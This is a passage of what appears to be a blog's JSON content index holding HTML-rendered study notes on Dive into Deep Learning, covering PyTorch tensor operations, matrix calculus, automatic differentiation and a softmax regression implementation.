<code>sum_A</code> with broadcasting to create a matrix where each row sums up to 1.<br> (And only when the dimension is equal to the original one ,broasting can work)<br> <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">A / sum_A</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">tensor([[[0.0000, 0.1429, 0.2222, 0.2727, 0.3077],</span></span><br><span class=\"line\"><span class=\"string\">        [1.0000, 0.8571, 0.7778, 0.7273, 0.6923]],</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">       [[0.4000, 0.4074, 0.4138, 0.4194, 0.4242],</span></span><br><span class=\"line\"><span class=\"string\">        [0.6000, 0.5926, 0.5862, 0.5806, 0.5758]]])</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br></pre></td></tr></table></figure></p>\n<h5><span id=\"cumsum\">cumsum</span></h5> <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">A.cumsum(axis=<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">tensor([[[ 0.,  1.,  2.,  3.,  4.],</span></span><br><span class=\"line\"><span class=\"string\">        [ 5.,  6.,  7.,  8.,  9.]],</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">       [[10., 12., 14., 16., 18.],</span></span><br><span class=\"line\"><span class=\"string\">        [20., 22., 24., 26., 28.]]]) &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<h4><span id=\"4254-dot-product\">4.2.5.4 Dot Product</span></h4><p>mathmatical defination:</p>\n<script type=\"math/tex; mode=display\">\nx,y \\in R,\\  x^Ty = \\\\sum_{i=1}^{d}x_{i}y_{i}</script><p>Each elements in Corresponding location multipys,then sum up.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">y = torch.ones(<span class=\"number\">3</span>, dtype = torch.float32)</span><br><span class=\"line\">x, y, torch.dot(x, y)</span><br><span class=\"line\"><span class=\"comment\">#(tensor([0., 1., 2.]), tensor([1., 1., 1.]), tensor(3.))</span></span><br></pre></td></tr></table></figure><br>or:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">torch.dot(x, y) == torch.<span class=\"built_in\">sum</span>(x*y)</span><br><span class=\"line\"><span class=\"comment\">#tensor(True)</span></span><br></pre></td></tr></table></figure></p>\n<p> It can be expressed as a  _weighted average_</p>\n<h4><span id=\"4255-matrix-vector-product\">4.2.5.5 Matrix-Vector Product</span></h4><p><code>mv</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">A.shape, x.shape, torch.mv(A, x), A@x</span><br><span class=\"line\"><span class=\"comment\">#(torch.Size([2, 3]), torch.Size([3]), tensor([3., 3.]), tensor([3., 3.]))</span></span><br></pre></td></tr></table></figure>\n<h4><span id=\"4256-matrix-matrix-product\">4.2.5.6 Matrix-Matrix Product</span></h4><p><code>mm</code><br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">B = torch.ones(<span class=\"number\">3</span>, <span class=\"number\">4</span>)</span><br><span class=\"line\">torch.mm(A, B), A@B</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">(tensor([[3., 3., 3., 3.],</span></span><br><span class=\"line\"><span class=\"string\">         [3., 3., 3., 3.]]),</span></span><br><span class=\"line\"><span class=\"string\"> tensor([[3., 3., 3., 3.],</span></span><br><span class=\"line\"><span class=\"string\">         [3., 3., 3., 3.]]))&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<h4><span id=\"4257-norm\">4.2.5.7 Norm</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">u = torch.tensor([<span class=\"number\">3.0</span>, -<span class=\"number\">4.0</span>])</span><br><span class=\"line\">torch.norm(u),torch.<span class=\"built_in\">abs</span>(u).<span class=\"built_in\">sum</span>()</span><br><span class=\"line\"><span class=\"comment\">#(tensor(5.), tensor(7.))</span></span><br></pre></td></tr></table></figure>\n","categories":["ML"],"tags":["d2l"]},{"title":"05_Calculus","url":"/2023/03/10/D2L_005_Calculus/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n<h2><span id=\"51-matrix-calculus\">5.1  Matrix calculus</span></h2><h3><span id=\"511-principle\">5.1.1 Principle</span></h3><p>assume </p>\n<script type=\"math/tex; mode=display\">f(x)\\ (scalar \\ function) \\ and \\ x \\ (colmun\\  vector)</script><script type=\"math/tex; mode=display\">\n\\partial f / \\partial x  = \\\\begin{\\begin{bmatrix}\n\\partial f / \\partial x_{1}  \\\\ \\partial f / \\partial x_{2}  \\\\ \\partial f / \\partial x_{3} \\\\ \\dots \\\\ \\partial f / \\partial x_{i}   \n\\end{bmatrix}}_{i*1}</script><p>The layout of the result depends on the laout of vector $x$(row or colmun).</p>\n<h3><span id=\"512-steps-to-caculate\">5.1.2 Steps to Caculate</span></h3><p>1) determine the layout according to the vector x<br>2) work out the partial derivation of  f .</p>\n<h3><span id=\"513-gradient\">5.1.3 Gradient</span></h3><p>THe outcome of matrix calculus.</p>\n<script type=\"math/tex; mode=display\">\n\\bigtriangledown_{x}f(x) = [\\partial_{x_{1}}f(x),\\partial_{x_{2}}f(x),\\partial_{x_{3}}f(x),\\partial_{x_{4}}f(x)...\\partial_{x_{n}}f(x)] ^T</script><h3><span id=\"514-realization-in-python\">5.1.4 Realization in Python</span></h3><h4><span id=\"5141-scalar-function-derivation\">5.1.4.1 Scalar function derivation</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-14%20at%2011.25.53%20AM.png\" alt=\"Screen Shot 2023-03-14 at 11.25.53 AM\"></p>\n<h2><span id=\"52-discussion-amp-summary\">5.2 Discussion  &amp; Summary</span></h2><p>tbc</p>\n","categories":["ML"],"tags":["d2l"]},{"title":"06_autoderivation","url":"/2023/03/14/D2L_006_Chain_Rule&automatic_derivation/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n<h2><span id=\"61-chain-rule\">6.1 Chain Rule</span></h2><h3><span id=\"610-scalar\">6.1.0 Scalar</span></h3><script type=\"math/tex; mode=display\">\ny = f(u),u = g(x)</script><script type=\"math/tex; mode=display\">\n\\frac {\\partial y}   {\\partial x} =\\frac {\\partial y}   {\\partial u}\\frac {\\partial u}   {\\partial x}</script><h3><span id=\"611-vector\">6.1.1 Vector</span></h3><script type=\"math/tex; mode=display\">\n\\frac {\\partial \\mathbf{y}} {\\partial \\mathbf{ {x}}} =\\frac {\\partial \\mathbf{y}} {\\partial \\mathbf{ {u}}}\\frac {\\partial \\mathbf{ {u}}} {\\partial \\mathbf{ {x}}}</script><p>(similar with scalar)</p>\n<h5><span id=\"example-linear-regression\">example - linear regression</span></h5><p>assume </p>\n<script type=\"math/tex; mode=display\">\n\\mathbf{x},\\mathbf{w} \\in R^n,y \\in R</script><script type=\"math/tex; mode=display\">\nz = (\\left \\langle \\mathbf{x},\\mathbf{w} \\right \\rangle - y)^2</script><p>caculate the </p>\n<script type=\"math/tex; mode=display\">\n\\frac {\\partial \\mathbf{z}}{\\partial \\mathbf{w}}</script><ol>\n<li>Decompose  =&gt;<script type=\"math/tex; mode=display\">\n\\begin{cases} a =\\left \\langle \\mathbf{x},\\mathbf{w} \\right \\rangle \\\\ b = a-y \\\\ z = b^2 \\end{cases}</script></li>\n</ol>\n<ol>\n<li>Partial derivation</li>\n</ol>\n<script type=\"math/tex; mode=display\">\n\\frac {\\partial {z} }   {\\partial \\mathbf{w} } =\\frac {\\partial  {z} }   {\\partial { {b }}}\\frac {\\partial  {b}}   {\\partial { {a} } }\\frac {\\partial { {a}}}   {\\partial \\mathbf{      {w}}}</script><p>3) subsitute a (1) into (2):  </p>\n<script type=\"math/tex; mode=display\">\n   =\\frac {\\partial  {b^2}}   {\\partial { {b}}}\\frac {\\partial  {a-y}}   {\\partial { {a}}}\\frac {\\partial { {\\left \\langle \\mathbf{x},\\mathbf{w} \\right \\rangle }}}   {\\partial \\mathbf{ {w}}}</script><script type=\"math/tex; mode=display\">\n=2b \\ \\cdot \\ 1 \\cdot \\mathbf{x}^T</script><script type=\"math/tex; mode=display\">\n= 2(\\left \\langle \\mathbf{x},\\mathbf{w} \\right \\rangle-y)\\mathbf{x}^T</script><h5><span id=\"summary\">summary</span></h5><p>we can draw the conclusion that for any functions ,we can decompose it ,and apply chain rule to expand then.<br>But in pratical case,especially the neutral network, the Calculations are extremly heavy, so we introduce a new method to caculate the derivation of functions.</p>\n<h2><span id=\"62-automatic-derivation\">6.2 Automatic Derivation</span></h2><h3><span id=\"620-currently-available-methods\">6.2.0 currently available methods</span></h3><p>1) symbolic derivation — Memorize some Common Derivation Formulas to work out(mathematica,etc.)<br>2) Numerical Derivation — Use a bunch of datas to fit the formula.</p>\n<h3><span id=\"621-realization\">6.2.1 realization</span></h3><p>Build a _computational graph_ that tracks how each value depends on others.</p>\n<h4><span id=\"6211-caculation-graph\">6.2.1.1 caculation graph</span></h4><p>1) decompose the code into operator.<br>2) present the caculation as a acyclic graph<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-14%20at%204.54.01%20PM.png\" alt=\"Screen Shot 2023-03-14 at 4.54.01 PM\"></p>\n<h4><span id=\"6212-two-models\">6.2.1.2 Two Models</span></h4><h5><span id=\"forward-propagation\">Forward Propagation</span></h5><script type=\"math/tex; mode=display\">\n\\frac {\\partial  {y}}   {\\partial { {x}}}=\\frac {\\partial  {y}}   {\\partial { {u_{n}}}}(\\frac {\\partial  {y}}   {\\partial { {u_{n}}}}(...(\\frac {\\partial  {u_{2}}}   {\\partial { {u_{1}}}}\\frac {\\partial  {u_{1}}}   {\\partial { {x}}}))\\frac {\\partial  {y}}   {\\partial { {x}}}=\\frac {\\partial  {y}}   {\\partial { {u_{n}}}}(\\frac {\\partial  {y}}   {\\partial { {u_{n}}}}(...(\\frac {\\partial  {u_{2}}}   {\\partial { {u_{1}}}}\\frac {\\partial  {u_{1}}}   {\\partial { {x}}}))</script><p>Need to store the Median.</p>\n<h5><span id=\"back-propagation\">Back Propagation</span></h5><script type=\"math/tex; mode=display\">\n\\frac {\\partial  {y}}   {\\partial { {x}}} = \n   (((\\frac {\\partial  y}   {\\partial{u_{n}}}\\frac {\\partial  {u_{n}}}   {\\partial { {u_{n-1}}}})...)\\frac {\\partial  {u_{2}}}   {\\partial { {u_{1}}}})\\frac {\\partial u_{1}}   {\\partial x}\\frac {\\partial  {y}}   {\\partial { {x}}} = \n   (((\\frac {\\partial  y}   {\\partial{u_{n}}}\\frac {\\partial  {u_{n}}}   {\\partial { {u_{n-1}}}})...)\\frac {\\partial  {u_{2}}}   {\\partial { {u_{1}}}})\\frac {\\partial u_{1}}   {\\partial x}</script><p>   <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-14%20at%205.12.52%20PM.png\" alt=\"Screen Shot 2023-03-14 at 5.12.52 PM\"></p>\n<h5><span id=\"comparation\">Comparation</span></h5><div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>Characteristic</th>\n<th>Backward</th>\n<th>Forward</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Memorize the media result?</td>\n<td>NO</td>\n<td>YES</td>\n</tr>\n<tr>\n<td>Computational complexity</td>\n<td>O(n)</td>\n<td>O(n)</td>\n</tr>\n<tr>\n<td>memory complexity</td>\n<td>O(1)</td>\n<td>O(n)</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h2><span id=\"63-realization-in-pytorch\">6.3 Realization in Pytorch</span></h2><h3><span id=\"631-scalar-function-grad\">6.3.1 Scalar Function Grad</span></h3><p>Example 1:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#In [2]:</span></span><br><span class=\"line\"></span><br><span class=\"line\">x = torch.arange(<span class=\"number\">4.0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#In [5]:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Can also create x = torch.arange(4.0, requires_grad=True)</span></span><br><span class=\"line\"></span><br><span class=\"line\">x.requires_grad_(<span class=\"literal\">True</span>) <span class=\"comment\">#Store the grad .</span></span><br><span class=\"line\"></span><br><span class=\"line\">x.grad  <span class=\"comment\"># The gradient is None by default</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#In [6]:</span></span><br><span class=\"line\"></span><br><span class=\"line\">y = <span class=\"number\">2</span> * torch.dot(x, x)</span><br><span class=\"line\"></span><br><span class=\"line\">y</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Out[6]:</span></span><br><span class=\"line\"></span><br><span class=\"line\">tensor(<span class=\"number\">28.</span>, grad_fn=&lt;MulBackward0&gt;)</span><br></pre></td></tr></table></figure>\n<p>Using backward propagation to caculate the gradient<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">y.backward()</span><br><span class=\"line\">x.grad</span><br><span class=\"line\"><span class=\"comment\">#tensor([ 0.,  4.,  8., 12.])</span></span><br></pre></td></tr></table></figure></p>\n<p>So the above code follows the follwing steps:<br>1) Generate vector<code>x</code>.<br>2) Activate the grad of <code>x</code>.<br>3) Generate  function <code>y</code> .<br>4) Use  <code>y.backward()</code> to caculate the <code>x.grad</code>  gradient automatically.</p>\n<p>Example 2:</p>\n<p>Pytorch will cumulate the gradient defaultly, so when start a new function, we need to clear the grad firstly.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">x.grad.zero_()<span class=\"comment\">#clear gradient(&quot;_&quot; represent rewrite)</span></span><br></pre></td></tr></table></figure><br>then define a new scalar function <code>y</code><br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">y = x.<span class=\"built_in\">sum</span>()</span><br></pre></td></tr></table></figure><br>Using the same way to work out the gradient :<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">y.backward()</span><br><span class=\"line\">x.grad</span><br><span class=\"line\"><span class=\"comment\">#tensor([1., 1., 1., 1.])</span></span><br></pre></td></tr></table></figure></p>\n<h3><span id=\"632-non-scalar-function-grad\">6.3.2 Non-scalar Function Grad</span></h3><p>In deeping , Case that need derivation of the vector funtion is rare, so we can use the scalar  sum to caculate the gradient.<br>like<code>y.sum().backward()</code> or <code>y.backward(gradient=torch.ones(len(y)))</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">x.grad.zero_()</span><br><span class=\"line\">y = x * x<span class=\"comment\">#thus y is not a scalar</span></span><br><span class=\"line\">y.backward(gradient=torch.ones(<span class=\"built_in\">len</span>(y)))  </span><br><span class=\"line\"><span class=\"comment\">#Faster: y.sum().backward()</span></span><br><span class=\"line\">x.grad</span><br><span class=\"line\"><span class=\"comment\">#tensor([0., 2., 4., 6.])</span></span><br></pre></td></tr></table></figure>\n<h3><span id=\"633-detaching-computation\">6.3.3 Detaching Computation</span></h3><p>Sometimes we want to just focus on specific varibles. For example, suppose we have <code>z = x * y</code> and <code>y = x * x</code> , but we want to focus on the _direct_ influence of <code>x</code> on <code>z</code> rather than the influence conveyed via <code>y</code>.<br>So we create a new varible <code>u = x * x</code>, but  <code>u</code> has no ancestors in the graph, and gradients do not flow through <code>u</code> to <code>x</code>.<br>We can consider<code>u</code> as a _constant_ with the value of <code>x * x</code>.<br>Thus the gradient value<code>x.grad()</code> will equal to<code>u</code>.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">x.grad.zero_()</span><br><span class=\"line\">y = x * x</span><br><span class=\"line\">u = y.detach()</span><br><span class=\"line\">z = u * x</span><br><span class=\"line\"></span><br><span class=\"line\">z.<span class=\"built_in\">sum</span>().backward()</span><br><span class=\"line\">x.grad == u</span><br></pre></td></tr></table></figure></p>\n<h2><span id=\"64-summary\">6.4 Summary</span></h2><p>So in this module we learned<br>1) The basic idea of the chain rule.<br>2) The basic idea automatic derivation.<br>3) Gradient realization in python.</p>\n","categories":["ML"],"tags":["d2l"]},{"title":"10_Softmax_Realization","url":"/2023/03/19/D2L_010_Softmax_Realization/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script><br>\n    <div id=\"aplayer-tanyTdcL\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  </p>\n<h2><span id=\"reading-dataset\">Reading Dataset</span></h2><p>Using the function to load the mnist dataset.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">from</span> IPython <span class=\"keyword\">import</span> display</span><br><span class=\"line\"><span class=\"keyword\">from</span> d2l <span class=\"keyword\">import</span> torch <span class=\"keyword\">as</span> d2l</span><br><span class=\"line\"></span><br><span class=\"line\">batch_size = <span class=\"number\">256</span></span><br><span class=\"line\">train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size)</span><br></pre></td></tr></table></figure></p>\n<p>Flatten each picture to a 28x28 = 784 size vector. And since we have 10 categories ,the dimension of output is 10.</p>\n<h2><span id=\"init-parameters\">Init Parameters</span></h2><p>And for the parameters w and b , we init it with normal distribution.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">num_inputs = <span class=\"number\">784</span></span><br><span class=\"line\">num_outputs = <span class=\"number\">10</span></span><br><span class=\"line\"></span><br><span class=\"line\">W = torch.normal(<span class=\"number\">0</span>, <span class=\"number\">0.01</span>, size=(num_inputs, num_outputs), requires_grad=<span class=\"literal\">True</span>)</span><br><span class=\"line\">b = torch.zeros(num_outputs, requires_grad=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure></p>\n<h2><span id=\"define-softmax\">Define Softmax</span></h2><p>Then we need to define the softmax operation:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">softmax</span>(<span class=\"params\">X</span>):</span></span><br><span class=\"line\">    X_exp = torch.exp(X)</span><br><span class=\"line\">    partition = X_exp.<span class=\"built_in\">sum</span>(<span class=\"number\">1</span>, keepdim=<span class=\"literal\">True</span>) <span class=\"comment\"># caculate the sum of each rows, to convert elements in each rows to a probability.</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> X_exp / partition  </span><br></pre></td></tr></table></figure><br>Use a example to verify the function we just defined:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">X = torch.normal(<span class=\"number\">0</span>, <span class=\"number\">1</span>, (<span class=\"number\">2</span>, <span class=\"number\">5</span>))</span><br><span class=\"line\">X_prob = softmax(X)</span><br><span class=\"line\">X_prob, X_prob.<span class=\"built_in\">sum</span>(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure></p>\n<p>looks like it works out.</p>\n<h2><span id=\"define-model\">Define Model</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">net</span>(<span class=\"params\">X</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> softmax(torch.matmul(X.reshape((-<span class=\"number\">1</span>, W.shape[<span class=\"number\">0</span>])), W) + b)</span><br><span class=\"line\">    <span class=\"comment\">#x multiply w , plus b</span></span><br></pre></td></tr></table></figure>\n<h2><span id=\"define-loss-function\">Define Loss Function</span></h2><p>We use <code>y_hat</code> to represent the prediction probability.<br>Fisrt , for  known two data samples in 3 categories, we indicates the sample 1 -&gt; [1,0,0] ,and smaple 2 -&gt; [0,0,1] ,corresponding with a “correct”  vector [0,2] which shows the correct values’s location.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">y = torch.tensor([<span class=\"number\">0</span>, <span class=\"number\">2</span>])</span><br></pre></td></tr></table></figure></p>\n<p>then we extart the outcome from model<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">y_hat = torch.tensor([[<span class=\"number\">0.1</span>, <span class=\"number\">0.3</span>, <span class=\"number\">0.6</span>], [<span class=\"number\">0.3</span>, <span class=\"number\">0.2</span>, <span class=\"number\">0.5</span>]])</span><br></pre></td></tr></table></figure></p>\n<p>Now what we need to do is present <code>y_hat</code> as a correct probabilty of prediction.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">y_hat[[<span class=\"number\">0</span>, <span class=\"number\">1</span>], y]</span><br></pre></td></tr></table></figure><br>the <code>[0,1]</code> corresponds to : 0 -&gt; [0.1, 0.3, 0.6], 1 -&gt;  [0.3, 0.2, 0.5]<br>and <code>y</code> means [0, 2] indicates the fist element on [0.1, 0.3, 0.6] , and the third element in [0.3, 0.2, 0.5]. Somewhat like “extract” the probability from the table according to the labels of y.</p>\n<h3><span id=\"cross-entropy-function\">cross entropy function</span></h3><p>Finish this step, we can easliy define the cross entropy function:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cross_entropy</span>(<span class=\"params\">y_hat, y</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> - torch.log(y_hat[<span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(y_hat)), y])</span><br><span class=\"line\">cross_entropy(y_hat, y)</span><br><span class=\"line\"><span class=\"comment\">#tensor([2.3026, 0.6931])</span></span><br></pre></td></tr></table></figure></p>\n<h2><span id=\"accuracy\">Accuracy</span></h2><p>Furthermore, we need a function to qulitify the accuracy of out predictions.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">accuracy</span>(<span class=\"params\">y_hat, y</span>):</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Caculate the number of corect predictions&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(y_hat.shape) &gt; <span class=\"number\">1</span> <span class=\"keyword\">and</span> y_hat.shape[<span class=\"number\">1</span>] &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">        y_hat = y_hat.argmax(axis=<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"comment\"># extarct the category tag into y_hat</span></span><br><span class=\"line\">    cmp = y_hat.<span class=\"built_in\">type</span>(y.dtype) == y</span><br><span class=\"line\">    <span class=\"comment\">#compara whether the predict tag is equal to the origin tag.</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">float</span>(cmp.<span class=\"built_in\">type</span>(y.dtype).<span class=\"built_in\">sum</span>())</span><br><span class=\"line\">    <span class=\"comment\"># cmp is 0 or 1, and each &quot;1&quot; indicates one correct prediction, so when we add them up, then divide with total number of predictions, we can obtain the accuracy.</span></span><br></pre></td></tr></table></figure><br>When we apply the simple Accuracy module into a hole model ,we gain a model accuracy function:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">evaluate_accuracy</span>(<span class=\"params\">net, data_iter</span>):</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;计算在指定数据集上模型的精度&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(net, torch.nn.Module):</span><br><span class=\"line\">        net.<span class=\"built_in\">eval</span>()  <span class=\"comment\"># Do not work out gradient</span></span><br><span class=\"line\">    metric = Accumulator(<span class=\"number\">2</span>)  <span class=\"comment\"># a cumulate sum toward variable, here we use it to store the sum of correct prediction and total prediction.</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> torch.no_grad():</span><br><span class=\"line\">        <span class=\"keyword\">for</span> X, y <span class=\"keyword\">in</span> data_iter:</span><br><span class=\"line\">            metric.add(accuracy(net(X), y), y.numel())</span><br><span class=\"line\">    <span class=\"keyword\">return</span> metric[<span class=\"number\">0</span>] / metric[<span class=\"number\">1</span>]</span><br></pre></td></tr></table></figure></p>\n<h2><span id=\"training\">Training</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">train_epoch_ch3</span>(<span class=\"params\">net, train_iter, loss, updater</span>):</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"comment\"># Switch the mode to train</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(net, torch.nn.Module):</span><br><span class=\"line\">        net.train()</span><br><span class=\"line\"></span><br><span class=\"line\">    metric = Accumulator(<span class=\"number\">3</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> X, y <span class=\"keyword\">in</span> train_iter:</span><br><span class=\"line\">        <span class=\"comment\"># 计算梯度并更新参数</span></span><br><span class=\"line\">        y_hat = net(X)</span><br><span class=\"line\">        l = loss(y_hat, y)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(updater, torch.optim.Optimizer):</span><br><span class=\"line\">            <span class=\"comment\"># 使用PyTorch内置的优化器和损失函数</span></span><br><span class=\"line\">            updater.zero_grad()</span><br><span class=\"line\">            l.mean().backward()</span><br><span class=\"line\">            updater.step()</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"comment\"># 使用定制的优化器和损失函数</span></span><br><span class=\"line\">            l.<span class=\"built_in\">sum</span>().backward()</span><br><span class=\"line\">            updater(X.shape[<span class=\"number\">0</span>])</span><br><span class=\"line\">        metric.add(<span class=\"built_in\">float</span>(l.<span class=\"built_in\">sum</span>()), accuracy(y_hat, y), y.numel())</span><br><span class=\"line\">    <span class=\"comment\"># 返回训练损失和训练精度</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> metric[<span class=\"number\">0</span>] / metric[<span class=\"number\">2</span>], metric[<span class=\"number\">1</span>] / metric[<span class=\"number\">2</span>]</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">train_ch3</span>(<span class=\"params\">net, train_iter, test_iter, loss, num_epochs, updater</span>):</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;训练模型（定义见第3章）&quot;&quot;&quot;</span></span><br><span class=\"line\">    animator = Animator(xlabel=<span class=\"string\">&#x27;epoch&#x27;</span>, xlim=[<span class=\"number\">1</span>, num_epochs], ylim=[<span class=\"number\">0.3</span>, <span class=\"number\">0.9</span>],</span><br><span class=\"line\">                        legend=[<span class=\"string\">&#x27;train loss&#x27;</span>, <span class=\"string\">&#x27;train acc&#x27;</span>, <span class=\"string\">&#x27;test acc&#x27;</span>])</span><br><span class=\"line\">    <span class=\"keyword\">for</span> epoch <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(num_epochs):</span><br><span class=\"line\">        train_metrics = train_epoch_ch3(net, train_iter, loss, updater)</span><br><span class=\"line\">        test_acc = evaluate_accuracy(net, test_iter)</span><br><span class=\"line\">        animator.add(epoch + <span class=\"number\">1</span>, train_metrics + (test_acc,))</span><br><span class=\"line\">    train_loss, train_acc = train_metrics</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> train_loss &lt; <span class=\"number\">0.5</span>, train_loss</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> train_acc &lt;= <span class=\"number\">1</span> <span class=\"keyword\">and</span> train_acc &gt; <span class=\"number\">0.7</span>, train_acc</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> test_acc &lt;= <span class=\"number\">1</span> <span class=\"keyword\">and</span> test_acc &gt; <span class=\"number\">0.7</span>, test_acc</span><br><span class=\"line\">lr = <span class=\"number\">0.1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">updater</span>(<span 